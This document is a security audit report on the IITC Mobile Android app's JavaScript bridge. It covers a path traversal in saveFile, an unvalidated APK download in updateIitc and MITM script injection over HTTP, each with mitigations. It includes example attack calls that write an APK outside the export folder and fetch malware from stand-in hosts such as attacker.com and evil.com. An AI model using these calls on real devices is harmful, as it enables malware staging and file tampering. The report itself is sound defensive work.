# Security Research Output — IITC Mobile JS Bridge

Findings verified against source code. Only VALID and PARTIAL findings included.

---

## Finding 1 — Path Traversal in `saveFile` via JS Bridge

**Verdict**: VALID
**Reported by**: deepseek-r1 (row 3), phi4 (row 8), llama3.2 (row 13), gemma3 (row 19)

### Problem Summary

`saveFile(String filename, String type, String content)` in `IITC_JSInterface.java` constructs a file path by directly concatenating the caller-controlled `filename` parameter with a base directory:

```java
final File outFile = new File(Environment.getExternalStorageDirectory().getPath() +
        "/IITC_Mobile/export/" + filename);
outFile.getParentFile().mkdirs();
final FileOutputStream outStream = new FileOutputStream(outFile);
outStream.write(content.getBytes("UTF-8"));
```

No sanitization or canonicalization is performed. A malicious JavaScript call such as:

```js
android.saveFile("../../Download/evil.apk", "application/vnd.android.package-archive", "<payload>");
```

...writes arbitrary content outside the intended `/IITC_Mobile/export/` directory to any location writable by the app on external storage (pre-Android 10). The `mkdirs()` call also silently creates attacker-specified directory trees.

The KitKat+ override (`IITC_JSInterfaceKitkat`) delegates to `IITC_FileManager.FileSaveRequest` — that implementation requires separate review.

### Potential Mitigation

1. Resolve the canonical path and assert it is inside the expected directory:
   ```java
   File base = new File(Environment.getExternalStorageDirectory(), "IITC_Mobile/export/");
   File outFile = new File(base, filename).getCanonicalFile();
   if (!outFile.getPath().startsWith(base.getCanonicalPath() + File.separator)) {
       throw new SecurityException("Path traversal detected");
   }
   ```
2. Reject filenames containing `/` or `..` segments before any path construction.
3. On Android 10+, use MediaStore API or `getExternalFilesDir()` which enforces scoped storage.

### Relevant Files

- `mobile/src/com/cradle/iitc_mobile/IITC_JSInterface.java` — `saveFile()` method
- `mobile/src/com/cradle/iitc_mobile/IITC_JSInterfaceKitkat.java` — KitKat+ `saveFile()` override
- `mobile/src/com/cradle/iitc_mobile/IITC_FileManager.java` — `FileSaveRequest` inner class

---

## Finding 2 — Arbitrary APK Download via `updateIitc`

**Verdict**: PARTIAL
**Reported by**: deepseek-r1 (row 7, as XSS — mechanism wrong but risk real), gemma3 (row 20, as Runtime.exec — mechanism wrong but risk real)

### Problem Summary

`updateIitc(String fileUrl)` in `IITC_JSInterface.java` passes the caller-controlled URL directly to Android's `DownloadManager` with no validation:

```java
// IITC_Mobile.java
public void updateIitc(final String url) {
    final DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
    request.setTitle("IITCm Update");
    final Uri fileUri = Uri.parse("file://" + getExternalFilesDir(null).toString() + "/iitcUpdate.apk");
    request.setDestinationUri(fileUri);
    deleteUpdateFile();
    final DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
    manager.enqueue(request);
}
```

Any JavaScript running in the WebView can silently trigger a background download of an arbitrary APK from any URL:

```js
android.updateIitc("http://attacker.com/malware.apk");
```

The download runs silently in the background. The downloaded file is named `iitcUpdate.apk` and stored in the app's external files directory. While Android requires the user to manually approve APK installation, the silent download itself is invisible to the user and primes the device for a social engineering step ("tap here to complete the update").

Note: AI inspectors speculated `Runtime.exec()` or XSS — neither was found. The actual risk is unauthorized APK staging.

### Potential Mitigation

1. Validate `fileUrl` against an HTTPS-only allowlist of trusted update servers before enqueuing.
2. After download, verify file integrity with a checksum or signature before displaying the install prompt.
3. Consider removing the JS-callable update mechanism entirely and routing updates through the Play Store or a dedicated in-app update flow that is not externally triggerable.

### Relevant Files

- `mobile/src/com/cradle/iitc_mobile/IITC_JSInterface.java` — `updateIitc()` bridge method
- `mobile/src/com/cradle/iitc_mobile/IITC_Mobile.java` — `updateIitc(String url)` DownloadManager implementation

---

## Finding 3 — MITM Script Injection via HTTP Content Loading

**Verdict**: PARTIAL
**Reported by**: phi4 (row 10, as "Protocol & Origin Security Concerns")

### Problem Summary

The bridge exposes powerful native capabilities (`saveFile`, `updateIitc`, `copy`, etc.) to any JavaScript executing inside the WebView. If the IITC script or any plugin update is fetched over plain HTTP, a network-positioned attacker (public Wi-Fi, rogue AP, ISP) can intercept the HTTP response and inject arbitrary JavaScript. That injected script immediately gains full access to all bridge methods — including triggering path traversal writes and APK downloads documented in Findings 1 and 2.

The threat is compounded because `updateIitc` itself accepts a URL: a MITM can inject a call to `android.updateIitc("http://evil.com/malware.apk")` into an HTTP-fetched script update.

Note: phi4 raised this without direct code evidence. The `async/UpdateScript.java` `isUpdateAllowed()` method enforces HTTPS only when the `pref_force_https` preference is set — suggesting HTTP fetches are possible in the default configuration.

### Potential Mitigation

1. Enforce HTTPS unconditionally for all remote script and plugin fetches — remove the HTTP fallback path in `UpdateScript.java`.
2. Enable `pref_force_https` by default (or remove the preference).
3. Implement certificate pinning for the IITC update server.
4. Consider signing script content and verifying signatures client-side before execution.

### Relevant Files

- `mobile/src/com/cradle/iitc_mobile/async/UpdateScript.java` — `isUpdateAllowed()` HTTPS check
- `mobile/src/com/cradle/iitc_mobile/IITC_WebView.java` — WebView initialization and content loading
- `mobile/src/com/cradle/iitc_mobile/IITC_WebViewClient.java` — URL loading/intercept hooks
